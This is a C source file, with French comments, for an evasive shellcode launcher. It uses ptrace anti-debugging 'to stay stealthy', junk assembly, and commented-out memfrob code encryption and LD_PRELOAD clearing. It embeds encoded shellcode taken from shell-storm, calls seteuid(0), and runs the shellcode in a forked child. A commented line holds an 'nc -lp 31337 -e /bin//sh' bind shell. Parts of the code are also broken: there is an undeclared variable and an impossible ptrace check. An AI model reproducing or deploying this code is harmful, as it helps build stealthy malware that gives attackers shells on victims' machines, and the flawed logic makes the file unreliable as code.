# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <assert.h>
# include <errno.h>
# include <sys/ptrace.h>
# include <unistd.h>

//cryptage des fonction sub
//extern void* __libc_csu_init;
//static void dummy();
//#define round_down(to_round,page_size) ((((unsigned long) to_round)/page_size)*page_size)
//#define round_up(to_round,page_size) (round_down(to_round, page_size) + page_size)
//static void __attribute__((constructor)) stub(void){
//void* start = &dummy;
//void* end = &__libc_csu_init;
//size_t code_size = (((unsigned long) end)) - ((unsigned long) start);
//size_t page_size = getpagesize();
//mprotect((void*) round_down(start, page_size), round_up(code_size, page_size),
//PROT_READ | PROT_WRITE | PROT_EXEC);
//memfrob(&dummy, code_size);
//mprotect((void*) round_down(start, page_size), round_up(code_size, page_size),
//PROT_READ | PROT_EXEC);
//}
//static void dummy(){}

//int detect_ld_env(char **envp){
//char **p;
//for (p = envp; *p != NULL; p++) {
//if ((*p)[0] == 'L' && (*p)[1] == 'D' && (*p)[2] == '_')
//return 1;
//}
//return 0;
//}


//void __attribute__((constructor)) cleanup(void){
//unsetenv("LD_PRELOAD");
//unsetenv("LD_LIBRARY_PATH");
//}
//long ptrace(int req, int pid, void *adr, void *dat){
//return 0;
//}

int main (void){
        
	  /* Junk code (dbg)*/
	  __asm__ volatile(
		"xor %eax,%eax \012"
		"xor %ebx,%ebx \012"
		"xor %ecx,%ecx \012"
		"xor %edx,%edx \012"
		"mov %ebx,%ecx \012"
		"inc %ecx \012"
		"mov $0x1A, %eax \012"
		"int $0x80 \012"
	  );

	if (byte_  != 0 ){
	    /* Junk code modified ?? */
	    exit(EXIT_FAILURE);
	}

        /* Routine anti débugg */
	if((ptrace(PTRACE_TRACEME,0,1,0) < 0) == -1 ){
		/* if DBG attached = exit to stay stealthy */
		exit(EXIT_FAILURE);
	}
	//www.shell-storm.org/shellcode/files/shellcode-679.php
	char shellcode[] = 
	                  ("\xeb\x11\x5e\x31\xc9\xb1\x43\x80\x6c\x0e\xff\x35\x80\xe9\x01"
                	   "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x95\x66\xf5\x66\x07\xe5"
          	           "\x40\x87\x9d\xa3\x64\xa8\x9d\x9d\x64\x64\x97\x9e\xbe\x18\x87"
           	           "\x9d\x62\x98\x98\x98\xbe\x16\x87\x20\x3c\x86\x88\xbe\x16\x02"
           	           "\xb5\x96\x1d\x29\x34\x34\x34\xa3\x98\x55\x62\xa1\xa5\x55\x68"
           	           "\x66\x68\x68\x6c\x55\x62\x9a\x55\x64\x97\x9e\xa3\x64\x64\xa8"
           	           "\x9d");

        
	int nPid=fork();
	//prctl(PR_SET_NAME, random_string()); //donne une nom aléatoire au pid la fonction random_string reste à coder 
	switch(nPid){
		case 0: {
			seteuid(0);
                        (*(void(*)()) shellcode)();
			//system(nc -lp 31337 -e /bin//sh);
		}
		default:{
			wait(NULL);
		}
        }
	return (0);
}


